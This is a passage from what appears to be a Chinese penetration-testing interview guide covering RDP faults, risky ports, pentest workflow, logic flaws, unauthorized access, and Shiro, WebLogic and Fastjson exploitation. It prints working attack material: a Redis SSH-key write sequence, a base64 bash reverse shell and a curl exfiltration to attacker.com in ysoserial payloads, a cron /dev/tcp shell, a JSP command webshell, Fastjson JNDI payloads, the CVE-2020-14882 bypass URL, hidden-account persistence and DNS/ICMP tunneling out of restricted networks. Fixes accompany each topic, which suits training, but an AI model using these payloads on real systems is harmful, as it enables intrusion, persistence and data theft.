        - 添加3389端口入站规则（Windows防火墙或第三方防火墙）。
        - 关闭防火墙临时测试：`net stop sharedaccess`（需管理员权限） 
            
        
3. **端口被占用或修改**
    
    - **特征**：使用`netstat -ano`检查端口占用情况。
    - **解决**：
        - 终止占用进程或修改注册表端口：
            
            Bash
            
            `# 注册表路径 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp → PortNumber`
            
        - 重启服务器生效 
        
4. **TCP/IP限制**
    
    - **特征**：网络策略限制连接。
    - **解决**：上传`mt.exe`执行`mt.exe -filter off`关闭TCP/IP筛选 
        
5. **用户权限不足**
    
    - **特征**：提示“用户无权远程登录”。
    - **解决**：将用户加入 **Remote Desktop Users** 组：
        
        Cmd
        
        `net localgroup "Remote Desktop Users" <用户名> /add`
        
     

---

### **二、客户端问题**

6. **本地防火墙/代理拦截**
    
    - **特征**：客户端无法发送RDP请求。
    - **解决**：检查出站规则，允许3389端口；关闭代理测试 
    
7. **配置错误**
    
    - **特征**：输入错误IP、域名解析失败或客户端软件异常。
    - **解决**：使用IP直连，更换客户端（如mstsc、Royal TS） 

---

### **三、网络环境问题**

8. **内网隔离/NAT限制**
    
    - **特征**：内网服务器未暴露公网IP。
    - **解决**：
        - 使用端口转发工具：`lcx -tran 公网端口 内网IP 3389`。
        - 配置路由器端口映射 
      
9. **网络延迟或丢包**
    
    - **特征**：间歇性连接失败。
    - **解决**：通过`ping`和`tracert`检查连通性，优化网络线路 
        
---

### **四、其他原因**

10. **安全软件拦截（如安全狗、SecureRDP）**
    
    - **特征**：第三方安全组件限制RDP。
    - **解决**：停止安全服务或删除相关注册表项（如`HKEY_LOCAL_MACHINE\SOFTWARE\Terminalsoft\WTSFilter`） 
        
11. **RDP协议版本不兼容**
    
    - **特征**：新旧系统间连接失败。
    - **解决**：升级系统或启用协议兼容模式 
        
12. **端口复用限制**
    
    - **特征**：防火墙拦截非标准端口流量。
    - **解决**：使用工具（如`antifw`）将3389与80端口复用 
     
---

### **排查工具与命令**

13. **端口检测**：
    - `telnet <IP> 3389`（返回空白表示端口开放）。
    - `netstat -ano | findstr 3389` 查看端口占用 
   
14. **日志分析**：检查系统日志（`eventvwr.msc`）定位错误 


## 12.常 问 的 端 口 信 息 ？
### **一、补充用户提到的端口**

|**端口**|**协议/服务**|**用途及风险**|
|---|---|---|
|21|FTP|文件传输，匿名登录、弱口令风险|
|22|SSH|安全远程管理，弱口令爆破、私钥泄露|
|23|Telnet|明文远程登录，易被嗅探截获凭据|
|25|SMTP|邮件传输，开放中继导致垃圾邮件发送|
|53|DNS|域名解析，域传送漏洞、DNS劫持|
|80|HTTP|Web服务，SQL注入、文件上传等漏洞|
|443|HTTPS|加密Web服务，心脏滴血漏洞（CVE-2014-0160）|
|1433|MSSQL|SQL Server数据库，SA弱口令、xp_cmdshell命令执行|
|3306|MySQL|MySQL数据库，弱口令、提权漏洞|
|3389|RDP|Windows远程桌面，弱口令、BlueKeep漏洞（CVE-2019-0708）|
|7001|WebLogic|Java中间件，反序列化漏洞（CVE-2017-10271）、控制台弱口令|
|8080|Apache Tomcat/Jenkins|Web应用服务器，管理后台弱口令、WAR包上传后门|

---

### **二、其他关键端口补充**

#### **1. 数据库服务**

|**端口**|**服务**|**安全风险**|
|---|---|---|
|5432|PostgreSQL|弱口令、命令执行漏洞|
|1521|Oracle|TNS监听漏洞、默认账户爆破|
|6379|Redis|未授权访问、写入SSH密钥或WebShell|
|27017|MongoDB|未授权访问、数据泄露|
|9200|Elasticsearch|未授权访问、数据泄露（CVE-2015-1427）|

#### **2. 中间件/应用服务器**

|**端口**|**服务**|**安全风险**|
|---|---|---|
|8089|Jboss/WildFly|管理控制台弱口令、反序列化漏洞|
|4848|GlassFish|默认管理端口，弱口令攻击|
|8161|ActiveMQ|管理界面弱口令、文件写入漏洞|
|9090|WebSphere|控制台漏洞（CVE-2015-7450）|

#### **3. 远程管理与协议**

|**端口**|**服务**|**安全风险**|
|---|---|---|
|5985/5986|WinRM|PowerShell远程命令执行（需Windows远程管理权限）|
|5900|VNC|图形化远程控制，弱口令、数据传输未加密|
|161|SNMP|默认团体名（如public）泄露设备信息|
|389|LDAP|目录服务，匿名查询敏感信息|

#### **4. 文件共享与传输**

|**端口**|**服务**|**安全风险**|
|---|---|---|
|445|SMB|永恒之蓝漏洞（MS17-010）、共享文件夹未授权访问|
|2049|NFS|配置不当导致文件系统暴露|
|69|TFTP|无认证文件传输，易被用于下载恶意文件|

#### **5. 邮件与通信协议**

|**端口**|**服务**|**安全风险**|
|---|---|---|
|110|POP3|明文传输邮件内容|
|143|IMAP|未加密通信导致信息泄露|
|465|SMTPS|加密邮件传输，配置错误可能引发中继攻击|
|5060|SIP|VoIP协议，拒绝服务攻击或通话窃听|

---

### **三、渗透测试重点关注端口**

1. **高危漏洞端口**：
    - **445**（SMB）：永恒之蓝漏洞利用。
    - **6379**（Redis）：未授权访问写入定时任务。
2. **数据泄露端口**：
    - **9200**（Elasticsearch）：未授权访问导致数据暴露。
    - **27017**（MongoDB）：配置错误泄露数据库内容。
3. **权限提升端口**：
    - **1521**（Oracle）：通过TNS漏洞获取系统权限。
    - **1433**（MSSQL）：通过xp_cmdshell执行系统命令。

---

### **四、防御建议**

4. **最小化开放端口**：关闭非必要服务，使用防火墙限制访问IP。
5. **服务加固**：
    - 数据库：禁用默认账户，限制远程访问。
    - 中间件：删除默认管理页面，更新至最新版本。
6. **协议安全**：
    - 禁用明文协议（Telnet、FTP），改用SSH/SFTP。
    - 配置SNMP团体名为强密码。
7. **监控与日志**：实时监测异常端口扫描与爆破行为。


## 13.渗透测试的流程？(主要看自己)
### **一、单一网站/应用测试流程**

#### **1. 信息收集**

- **CDN检测与真实IP获取**
    
    - **检测方法**：
        - 多地Ping测试（如`ping.chinaz.com`）。
        - DNS历史记录（`SecurityTrails`、`ViewDNS`）。
    - **绕过手段**：
        - 子域名探测（`subfinder`、`OneForAll`）。
        - 邮件服务器解析（触发密码重置邮件获取源站IP）。
        - 国外节点请求（如使用海外VPS绕过区域CDN）。
- **资产扩展**
    
    - **旁站/C段扫描**：
        - 工具：`Nmap`扫描同C段（`nmap -sn 192.168.1.0/24`）。
        - 在线平台：`FOFA`、`Shodan`按IP段搜索。
    - **关联资产**：
        - App/小程序：抓包提取API接口（`BurpSuite`、`Charles`）。
        - 微信公众号：逆向获取后端接口。
- **指纹识别**
    
    - **CMS识别**：`Wappalyzer`、`WhatWeb`。
    - **中间件/框架**：通过HTTP头（如`Server: nginx`）、错误页面特征。
    - **插件/组件**：检查`/wp-content/plugins/`等目录版本信息。

#### **2. 漏洞探测**

- **自动化扫描**
    
    - **端口探测**：`Nmap`脚本扫描（`-sV -sC`）。
    - **目录爆破**：`Dirsearch`、`FFuf`（加载常见字典如`common.txt`）。
    - **敏感信息泄露**：
        - JS文件分析（`LinkFinder`提取API路径）。
        - GitHub监控（`GitHound`搜索硬编码密钥）。
- **手动测试**
    
    - **常规漏洞**：
        - SQL注入：手工构造`' and 1=1--`测试参数。
        - XSS：验证输入点是否过滤`<script>alert(1)</script>`。
        - 文件上传：绕过黑名单（`.php5`、`大小写混合`）。
    - **业务逻辑漏洞**：
        - 越权：修改Cookie或URL中的`userid`参数。
        - 支付漏洞：修改订单金额为负数或极低值。

#### **3. 权限提升与后渗透**

- **WebShell利用**：通过文件上传或命令执行注入获取立足点。
- **数据库提权**：利用MySQL的UDF函数或MSSQL的`xp_cmdshell`执行系统命令。
- **横向移动**：
    - 内网扫描（`Proxychains+Nmap`）。
    - 凭证窃取（Mimikatz抓取密码、SSH密钥复用）。

---

### **二、网段/区域测试流程**

#### **1. 资产测绘**

- **批量扫描**：
    - 工具：`Goby`（自动识别协议、服务）。
    - 参数：`goby -i 192.168.1.0/24 -p 80,443,22,3389`。
- **存活探测**：
    - ICMP扫描：`fping -g 192.168.1.0/24`。
    - 端口开放检测：`Masscan -p1-65535 192.168.1.0/24`。

#### **2. 漏洞批量化利用**

- **漏洞验证**：
    - **高风险漏洞**：MS17-010（永恒之蓝）、Redis未授权访问。
    - **自动化利用**：`Metasploit`模块（`use exploit/windows/smb/ms17_010_eternalblue`）。
- **弱口令爆破**：
    - 协议：RDP、SSH、MySQL（工具：`Hydra`、`Medusa`）。
    - 字典：`rockyou.txt`、自定义字典（针对企业常见密码）。

#### **3. 内网渗透**

- **权限维持**：
    - 创建隐藏账户：`net user backup$ Admin123 /add`。
    - 计划任务：`schtasks /create /tn "Update" /tr "C:\shell.exe" /sc hourly`。
- **数据窃取**：
    - 敏感文件搜索（`*.docx`、`*.xlsx`、`config.*`）。
    - 数据库导出：`mysqldump -u root -p --all-databases > alldb.sql`。

---

### **三、报告与防御建议**

#### **1. 漏洞分级**

- **高危**：直接导致系统沦陷（如RCE、SQL注入）。
- **中危**：信息泄露、越权访问。
- **低危**：配置不当、冗余服务。

#### **2. 修复方案**

- **紧急修复**：关闭高危端口、修补已知漏洞（如Apache Struts补丁）。
- **长期加固**：
    - 网络隔离：划分VLAN，限制内网互通。
    - 日志审计：部署SIEM（如Elasticsearch）监控异常行为。

---

### **四、工具清单**

|**阶段**|**工具**|
|---|---|
|**信息收集**|Nmap、FOFA、OneForAll、Wappalyzer|
|**漏洞扫描**|Goby、Nessus、Xray|
|**漏洞利用**|Metasploit、Sqlmap、Cobalt Strike|
|**后渗透**|Mimikatz、Proxychains、BloodHound|
|**报告编写**|Dradis、Pentest-Tools模板|

## 14.什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式？

逻辑漏洞是由于业务流程设计缺陷或校验不严导致的非预期行为，攻击者可通过篡改参数、绕过验证等方式破坏业务逻辑。以下是三种典型业务逻辑漏洞及修复方案：

---

### **一、支付逻辑漏洞**

#### **常见案例**

1. **价格篡改**：前端提交订单时修改`price`参数（如100→0.01）。
2. **订单替换**：截获订单ID，替换为低价商品订单完成支付。
3. **数量溢出**：设置商品数量为负数或极大值导致总价异常（如`quantity=-1`）。

#### **修复方案**

- **后端校验**：订单金额、商品数量等关键参数由服务端生成，禁止前端传入。
- **签名防篡改**：对订单参数生成HMAC签名，校验数据完整性。
- **状态隔离**：支付成功后更新订单状态为“已完成”，防止重复支付或状态回滚。

---

### **二、密码找回逻辑漏洞**

#### **常见案例**

4. **验证码爆破**：4位验证码可被暴力破解（如10^4次尝试）。
5. **跳过验证步骤**：直接访问最终密码重置页面（如`/reset?step=3`）。
6. **凭证未绑定用户**：使用任意手机号获取验证码重置他人密码。

#### **修复方案**

- **验证码绑定**：将验证码与用户身份（如Session ID）绑定，确保一对一校验。
- **步骤强制顺序**：服务端记录当前步骤，禁止跳过中间环节。
- **多因素验证**：重置密码需同时验证邮箱、手机号或安全问题。

---

### **三、验证码逻辑漏洞**

#### **常见案例**

7. **前端绕过**：删除请求中的`captcha`参数或置空值。
8. **重放攻击**：重复使用已失效的验证码（如未设置一次性校验）。
9. **逻辑缺陷**：验证码校验与业务操作分离（先校验验证码，后执行敏感操作）。

#### **修复方案**

- **服务端状态管理**：验证码使用后立即失效，防止重放。
- **强制时序校验**：验证码校验与业务操作原子化（如校验成功后再允许提交表单）。
- **图形干扰**：增加滑动验证、点选文字等交互式验证码，提升自动化攻击难度。

---

### **四、其他常见逻辑漏洞**

#### **1. 越权漏洞**

- **案例**：修改URL中的`userid`参数访问他人数据（平行越权）。
- **修复**：从Session获取用户身份，而非依赖前端传入参数。

#### **2. 会话固定攻击**

- **案例**：诱导用户使用攻击者预设的Session ID登录，劫持会话。
- **修复**：登录成功后重置Session ID，并绑定用户IP/UA信息。

---

### **五、防御体系建议**

10. **代码审计**：定期审查核心业务逻辑代码（如支付、登录、密码重置）。
11. **流量监控**：部署WAF识别异常参数（如负数价格、超长数量）。
12. **渗透测试**：模拟攻击者视角测试业务链路，提前发现逻辑缺陷。

通过严格的前后端校验与状态管理，可有效封堵逻辑漏洞，保障业务安全性。

## 15.未授权访问你可以简单说说吗

未授权访问漏洞是指服务未正确配置身份验证机制，导致攻击者无需有效凭据即可直接访问敏感功能或数据。以下是典型漏洞案例及修复方案：

---

### **一、Redis未授权访问漏洞**

#### **漏洞原理**

- **原因**：Redis默认监听`0.0.0.0:6379`且未设置密码认证（`requirepass`）。
- **攻击流程**：
    1. **连接数据库**：`redis-cli -h 目标IP`。
    2. **写入SSH公钥**：
        
        Bash
        
        `# 攻击机生成密钥对 ssh-keygen -t rsa -f redis_key # 将公钥写入Redis (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt redis-cli -h 目标IP flushall cat key.txt | redis-cli -h 目标IP -x set crackit redis-cli -h 目标IP config set dir /root/.ssh/ redis-cli -h 目标IP config set dbfilename "authorized_keys" redis-cli -h 目标IP save`
        
    3. **SSH免密登录**：`ssh -i redis_key root@目标IP`。

#### **漏洞危害**

- **数据泄露**：读取/删除数据库内容。
- **权限提升**：写入计划任务（`crontab`）或SSH密钥获取服务器权限。
- **内网渗透**：作为跳板攻击内网其他主机。

#### **修复方案**

1. **启用认证**：修改`redis.conf`，设置强密码：
    
    Ini
    
    `requirepass YourStrongPassword`
    
2. **网络隔离**：绑定本地IP（`bind 127.0.0.1`），禁止公网暴露。
3. **权限控制**：以非root用户运行Redis，禁用高危命令：
    
    Ini
    
    `rename-command FLUSHALL "" rename-command CONFIG ""`
    

---

### **二、JBoss未授权访问漏洞**

#### **漏洞原理**

- **原因**：JBoss管理控制台（`/jmx-console`、`/web-console`）默认无认证。
- **攻击流程**：
    1. **访问管理界面**：`http://目标IP:8080/jmx-console`。
    2. **部署WAR木马**：通过`Deployer`上传恶意WAR文件，获取WebShell。

#### **漏洞危害**

- **远程代码执行（RCE）**：通过部署后门执行任意命令。
- **敏感信息泄露**：查看服务器配置、数据源信息等。

#### **修复方案**

4. **启用身份验证**：修改`jmx-console-users.properties`，添加用户名密码：
    
    Properties
    
    `admin=YourStrongPassword`
    
5. **删除默认页面**：移除`jmx-console.war`和`web-console.war`。
6. **网络限制**：使用防火墙限制管理端口（8080、9990）仅允许可信IP访问。

---

### **三、其他常见未授权访问漏洞**

#### **1. MongoDB未授权访问**

- **漏洞**：默认无认证且监听所有IP（`0.0.0.0:27017`）。
- **利用**：直接连接并导出数据库或执行命令（若开启`serverSideJavaScript`）。
- **修复**：启用认证，限制绑定IP。

#### **2. Elasticsearch未授权访问**

- **漏洞**：默认开放9200端口，可远程执行ES查询或写入恶意脚本。
- **修复**：配置`xpack.security.enabled: true`，设置账号密码。

#### **3. Docker API未授权访问**

- **漏洞**：Docker守护进程（`2375`端口）无认证，可创建恶意容器提权。
- **修复**：启用TLS认证或限制访问IP。

---

### **四、通用防御措施**

7. **最小化服务暴露**：仅开放必要端口，禁用公网访问管理接口。
8. **强制身份验证**：所有敏感服务均配置账号密码或密钥认证。
9. **定期安全扫描**：使用Nmap、Nessus等工具检测未授权服务。
10. **日志监控**：记录异常登录和未授权访问尝试，及时告警。

## 16.打点一般会用什么漏洞？

### **一、优先利用的Java反序列化漏洞**

#### **1. Apache Shiro反序列化漏洞**

- **漏洞类型**：
    - **Shiro-550（CVE-2016-4437）**：默认硬编码AES密钥导致Cookie反序列化RCE 
        
        
    - **Shiro-721（CVE-2019-12422）**：利用Padding Oracle Attack伪造RememberMe Cookie实现RCE 
        
- **利用条件**：
    - Shiro版本<=1.2.4（550）或存在有效Cookie（721）。
    - 特征：响应包含`rememberMe=deleteMe`或Cookie中存在`rememberMe`字段。
- **攻击工具**：`ysoserial`生成Payload，`ShiroExploit`一键化利用 
    
#### **2. Fastjson反序列化漏洞**

- **漏洞原理**：通过`@type`属性触发JNDI注入（如CVE-2022-25845） 
    
    Json
`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com/Exploit"}`
    
- **利用流程**：
    1. 构造恶意JSON触发漏洞，加载远程RMI/LDAP服务。
    2. 靶机请求攻击者控制的恶意类（如执行系统命令）。

#### **3. WebLogic反序列化漏洞**

- **典型漏洞**：
    - **T3协议反序列化（CVE-2018-2893）**：默认开启T3协议，攻击者发送恶意序列化数据实现RCE 
        
    - **IIOP协议漏洞**：通过CORBA接口触发反序列化链。
- **修复建议**：禁用T3/IIOP协议或限制IP访问 
    
    
#### **4. 用友OA反序列化漏洞**

- **典型接口**：
    - **UserAuthenticationServlet（XVE-2024-18302）**：未经认证发送恶意序列化数据实现RCE 
        

    - **blobRefClassSearch**：Fastjson反序列化漏洞（CVE-2023-xxx） 
        
- **工具支持**：集成化工具如`YongYouNcTool`可批量检测漏洞 
   
---

### **二、其他高优先级打点漏洞**

#### **1. 未授权访问**

- **Redis**：写入SSH公钥或计划任务（`set crackit <公钥>` + `config set dir`）[[搜索结果未标注]]。
- **JBoss**：访问`/jmx-console`直接部署WAR木马[[搜索结果未标注]]。

#### **2. 文件上传漏洞**

- **绕过方式**：
    - 修改文件后缀（`.jspx`→`.jsp`）。
    - 利用解析漏洞（如IIS短文件名、Apache多后缀解析）。

#### **3. 弱口令/默认凭证**

- **中间件**：Tomcat（`admin:admin`）、WebLogic（`weblogic:Oracle123`）。
- **数据库**：MySQL（`root:空密码`）、MSSQL（`sa:sa`）。

---

### **三、权限影响与降权分析**

- **高权限场景**：
    - **WebLogic**：默认以`weblogic`用户运行（Linux）或系统权限（Windows）。
    - **用友NC**：部分服务以SYSTEM权限运行，提权风险极高 
        
- **降权风险**：
    - **容器化部署**：Docker环境下服务可能以非root用户运行。
    - **沙箱限制**：Java Security Manager限制敏感操作（如文件读写）。

---

### **四、辅助漏洞利用策略**

#### **1. 横向渗透**

- **内网扫描**：使用`Proxychains+Nmap`探测存活主机及开放端口。
- **凭证窃取**：通过Mimikatz抓取Windows密码或Redis未授权读取敏感配置。

#### **2. 权限维持**

- **WebShell**：写入JSP马或利用中间件热部署功能（如Tomcat的`/manager/html`）。
- **计划任务**：通过Redis或反序列化漏洞写入定时任务（`*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1`）。

---

### **五、修复建议**

1. **组件升级**：
    - Shiro升级至1.7.1+，使用随机密钥 
    
    - Fastjson禁用AutoType（`ParserConfig.getGlobalInstance().setSafeMode(true)`） 
        
    
2. **网络隔离**：
    - WebLogic限制T3协议访问IP 
       
    - Redis绑定`127.0.0.1`并设置密码[[搜索结果未标注]]。
3. **权限最小化**：
    - 以非root用户运行Java服务。
    - 禁用危险命令（如Redis的`CONFIG`、`FLUSHALL`）。

---

通过优先利用Java反序列化等高危漏洞快速突破边界，再结合辅助漏洞横向渗透，可高效完成打点任务。实际攻击需根据目标环境动态调整策略，并遵守授权范围。

## 17.平常怎么去发现shiro漏洞的？

### **一、手动检测Shiro框架存在性**

#### **1. 响应头特征**

- **未登录请求**：
    
    - **请求Cookie**：无`rememberMe`字段。
    - **响应Set-Cookie**：无`rememberMe=deleteMe`。
- **登录失败请求**：
    
    - **响应Set-Cookie**：无论是否勾选“RememberMe”，均返回`rememberMe=deleteMe`。
- **登录成功请求**：
    
    - **未勾选RememberMe**：响应Set-Cookie返回`rememberMe=deleteMe`，但后续请求Cookie中无`rememberMe`字段。
    - **勾选RememberMe**：响应Set-Cookie返回`rememberMe=deleteMe`和有效`rememberMe`值，后续请求Cookie中携带`rememberMe`字段。

#### **2. 其他特征**

- **默认错误页面**：部分Shiro配置会返回包含`org.apache.shiro`的错误堆栈信息。
- **URL路径**：存在`/login`、`/logout`等Shiro默认拦截路径。

---

### **二、自动化检测工具**

#### **1. 被动扫描**

- **工具**：`ShiroScan`（Burp插件）、`shiro_detect`（Python脚本）。
- **原理**：检测响应头中的`rememberMe=deleteMe`字段，自动标记潜在目标。

#### **2. 主动探测**

- **密钥爆破**：使用`shiro_attack`工具尝试常见硬编码密钥（如`kPH+bIxk5D2deZiIxcaaaA==`）。
- **回显检测**：发送包含恶意序列化数据的Cookie，观察DNSLog或HTTP请求是否触发。

---

### **三、漏洞利用流程**

#### **1. 检测密钥**

- **步骤**：
    
    1. 构造恶意序列化数据，使用已知密钥列表生成加密Cookie。
    2. 发送带有恶意Cookie的请求，通过DNSLog或HTTP回调验证漏洞。
    3. 若收到回调，确认密钥有效并触发反序列化漏洞。
- **常用密钥列表**：
    
    Plaintext
    
    `kPH+bIxk5D2deZiIxcaaaA== zSyK5Kp6PZAAjlT+eeNMlg== 4AvVhmFLUs0KTA3Kprsdag==`
    

#### **2. 生成Payload**

- **工具**：`ysoserial`生成CommonsBeanutils链Payload：
    
    Bash
    
    `java -jar ysoserial.jar CommonsBeanutils1 "curl http://attacker.com/$(whoami)" > payload.bin`
    
- **加密Payload**：使用检测到的密钥对Payload进行AES加密并Base64编码。

#### **3. 发送恶意请求**

- **构造Cookie**：
    
    Http
    
    `GET /admin HTTP/1.1 Cookie: rememberMe=加密后的Payload`
    

---

### **四、修复建议**

1. **升级Shiro版本**：
    - 升级至1.7.1+版本，禁用旧版硬编码密钥。
2. **自定义密钥**：
    - 修改`shiro.ini`或`SecurityManager`配置，使用随机强密钥：
        
        Ini
        
        `securityManager.rememberMeManager.cipherKey = 自定义Base64密钥`
        
3. **禁用RememberMe**：
    - 非必要场景下关闭该功能：
        
        Java
        
        `CookieRememberMeManager rememberMeManager = new CookieRememberMeManager(); rememberMeManager.setCookie(null);  // 禁用Cookie`
        
4. **输入过滤**：
    - 拦截包含`rememberMe`且长度异常的Cookie。

---

### **五、案例复现**

#### **场景**：Shiro 1.2.4默认密钥漏洞利用

1. **检测密钥**：使用`ShiroExploit`工具检测到密钥`kPH+bIxk5D2deZiIxcaaaA==`。
2. **生成Payload**：
    
    Bash
    
    `java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin`
    
3. **发送请求**：
    
    Http
    
    `GET / HTTP/1.1 Cookie: rememberMe=加密后的Payload`
    
4. **接收反弹Shell**：攻击机监听4443端口获取目标Shell。


## 18.weblogic权限绕过？



通过静态资源来绕过权限验证，防止被重定向到登陆界面。

通过请求.portal ，控制处理的Servlet 是渲染UI 的

MBeanUtilsInitSingleFileServlet 。

通过编码后的../ ，让最终渲染的模版是console.portal 。

### **一、漏洞原理**

#### **1. 权限绕过机制**

- **漏洞编号**：CVE-2020-14882（权限绕过） + CVE-2020-14883（RCE）。
- **根本原因**：WebLogic管理接口（`/console/`）的URL访问控制逻辑缺陷，允许未经认证的用户绕过权限检查，直接访问管理功能。
- **关键路径**：
    - **静态资源请求**：请求`.css`、`.js`等静态资源时，权限校验不严格。
    - **路径遍历**：利用双重编码（如`%252E%252E%252F` → `../`）绕过路径校验，访问受限页面。

#### **2. 利用流程**

1. **构造恶意URL**：通过路径遍历访问管理接口`console.portal`。
2. **触发Servlet**：请求由`MBeanUtilsInitSingleFileServlet`处理，渲染管理界面。
3. **执行操作**：结合CVE-2020-14883上传恶意JSP文件实现RCE。

---

### **二、漏洞复现步骤**

#### **1. 权限绕过（CVE-2020-14882）**

- **访问管理控制台**：  
    构造以下URL绕过认证（需替换目标IP）：
    
    Http
    
    `http://目标IP:7001/console/css/%252e%252e%252fconsole.portal`
    
    - **编码解析**：`%252e%252e%252f` → URL解码两次 → `../`。
    - **效果**：直接进入WebLogic管理控制台，无需登录。

#### **2. 远程代码执行（CVE-2020-14883）**

- **上传恶意JSP文件**：  
    通过管理控制台的**Deployments**功能上传包含WebShell的WAR包。
    - **WebShell示例**（`shell.jsp`）：
        
        Jsp
        
        `<%@ page import="java.util.*,java.io.*"%> <% if (request.getParameter("cmd") != null) {     Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));     OutputStream os = p.getOutputStream();     InputStream in = p.getInputStream();     DataInputStream dis = new DataInputStream(in);     String disr = dis.readLine();     while ( disr != null ) {         out.println(disr);         disr = dis.readLine();     } } %>`
        
- **执行系统命令**：访问WebShell执行任意命令：
    
    Http
    
    `http://目标IP:7001/shell.jsp?cmd=whoami`
    

---

### **三、影响版本**

- **受影响版本**：
    - Oracle WebLogic 10.3.6.0.0
    - Oracle WebLogic 12.1.3.0.0
    - Oracle WebLogic 12.2.1.3.0、12.2.1.4.0
    - Oracle WebLogic 14.1.1.0.0
- **修复版本**：安装Oracle 2020年10月关键补丁更新（CPU）。

---

### **四、修复方案**

4. **安装补丁**：
    - 下载并应用Oracle官方补丁（Patch 32453332）。
5. **网络隔离**：
    - 限制`/console/`和`/management/`路径仅允许可信IP访问。
    - 使用防火墙关闭7001端口公网暴露。
6. **权限加固**：
    - 禁用不必要的管理功能（如WLST）。
    - 修改默认管理账户密码，启用多因素认证。

---

### **五、防御检测**

- **入侵检测**：监控异常URL请求（如包含`%252e%252e%252f`的路径）。
- **日志审计**：分析WebLogic日志（`DOMAIN_HOME/servers/AdminServer/logs/access.log`）中的未授权访问记录。

---

### **六、实际案例**

- **攻击链**：  
    攻击者通过CVE-2020-14882绕过认证，访问管理控制台后部署恶意WAR包，利用CVE-2020-14883执行`whoami`确认权限，最终植入挖矿木马。
- **工具利用**：集成化工具（如`CVE-2020-14882-EXP`）自动化完成漏洞检测与利用。

## 19.fastjson漏洞利用原理？
### **一、漏洞核心机制**

#### **1. AutoType功能**

- **功能作用**：Fastjson通过`@type`字段指定反序列化后的具体类，动态加载类。
- **漏洞触发**：未严格校验`@type`指定的类，导致攻击者传入危险类（如`TemplatesImpl`、`JdbcRowSetImpl`）。

#### **2. 关键类利用链**

- **TemplatesImpl类**：
    
    - **字段**：`_bytecodes`存储字节码，`_outputProperties`的getter方法触发类加载。
    - **执行流程**：
        1. 反序列化时，Fastjson调用`getOutputProperties()`方法。
        2. 该方法加载`_bytecodes`中的字节码，实例化并执行恶意代码。
- **JdbcRowSetImpl类**：
    
    - **JNDI注入**：通过`dataSourceName`指定恶意LDAP/RMI服务，触发远程类加载。

---

### **二、漏洞利用步骤**

#### **1. 构造恶意JSON**

- **TemplatesImpl利用**：
    
    Json
    
    `{   "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",   "_bytecodes": ["恶意类字节码Base64"],   "_name": "test",   "_tfactory": {},   "_outputProperties": {} }`
    
    - **字节码生成**：将恶意Java代码编译为.class文件后Base64编码。
- **JdbcRowSetImpl利用（JNDI注入）**：
    
    Json
    
    `{   "@type": "com.sun.rowset.JdbcRowSetImpl",   "dataSourceName": "ldap://attacker.com/Exploit",   "autoCommit": true }`
    

#### **2. 触发反序列化**

- **请求注入**：向目标发送包含恶意JSON的HTTP请求，触发Fastjson解析。
- **漏洞触发点**：目标服务使用`JSON.parse()`或`JSON.parseObject()`处理不可信数据。

#### **3. 代码执行**

- **TemplatesImpl路径**：`getOutputProperties()` → `newTransformer()` → 加载字节码执行命令。
- **JNDI路径**：连接攻击者控制的JNDI服务，加载远程恶意类（如反弹Shell代码）。

---

### **三、影响版本**

- **高危版本**：
    - Fastjson <= 1.2.24（默认开启AutoType）。
    - Fastjson <= 1.2.68（存在AutoType绕过漏洞）。
- **修复版本**：1.2.83+（启用SafeMode彻底禁用AutoType）。

---

### **四、漏洞修复方案**

1. **升级Fastjson**：
    - 使用最新版本（>=1.2.83）并启用SafeMode：
        
        Java
        
        `ParserConfig.getGlobalInstance().setSafeMode(true);`
        
2. **输入过滤**：
    - 禁止反序列化不可信数据，过滤`@type`字段。
3. **JVM参数限制**：
    - 添加`-Dfastjson.parser.autoTypeSupport=false`关闭AutoType。

---

### **五、防御检测**

- **流量监控**：识别请求中异常的`@type`类名（如`com.sun.rowset.JdbcRowSetImpl`）。
- **日志审计**：监控Fastjson反序列化错误日志，定位攻击尝试。

---

### **六、案例复现**

#### **场景**：Fastjson 1.2.24反序列化RCE

4. **生成恶意类**：
    
    Java
    
    `public class Exploit {     static {        try {            Runtime.getRuntime().exec("calc.exe");         } catch (Exception e) { }    } }`
    
    - 编译为`Exploit.class`并Base64编码。
5. **构造Payload**：
    
    Json
    
    `{   "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",   "_bytecodes": ["yv66vgAAADQA...（Base64编码后的Exploit.class）"],   "_name": "a",   "_tfactory": {},   "_outputProperties": {} }`
    
6. **发送请求**：目标解析该JSON后弹出计算器（Windows）或执行其他系统命令。


## 20.拿到webshell不出网情况下怎么办？

reg上传去正向连接。探测出网协议，如dns，icmp。

### **一、建立正向代理通道**

#### **1. 使用reGeorg+Proxifier（推荐）** 


- **步骤**：
    1. **上传隧道文件**：将`tunnel.jsp`/`tunnel.aspx`等上传至Web目录。
    2. **启动代理服务**：
        
        Bash
        
        `python reGeorgSocksProxy.py -p 1080 -u http://目标网站/tunnel.jsp`
        
    3. **配置Proxifier**：设置全局代理规则，将流量转发至本地1080端口。
- **优势**：支持HTTP正向代理，绕过防火墙限制。

#### **2. 其他代理工具**

- **EarthWorm**：支持多协议（socks5/http）隧道，适用于复杂内网环境。
- **Neo-reGeorg**：改进版reGeorg，支持加密通信和自定义Header。

---

### **二、探测出网协议**

#### **1. DNS隧道（隐蔽性高）** 


- **工具**：`dnscat2`、`iodine`。
- **步骤**：
    1. **攻击端启动服务**：
        
        Bash
        
        `dnscat2-server --domain=attacker.com`
        
    2. **目标端连接**：
        
        Bash
        
        `dnscat2-client attacker.com`
        
- **检测出网**：
    
    Bash
    
    `nslookup attacker.com  # 若返回解析记录，说明DNS出网可用`
    

#### **2. ICMP隧道（绕过严格管控）** 


- **工具**：`ptunnel-ng`、`icmpsh`。
- **步骤**：
    1. **攻击端监听**：
        
        Bash
        
        `sudo ptunnel-ng -x 123456  # 设置隧道密码`
        
    2. **目标端连接**：
        
        Bash
        
        `ptunnel-ng -p 攻击机IP -l 123456`
        

#### **3. HTTP协议复用** 

6

- **场景**：仅允许80/443端口出站。
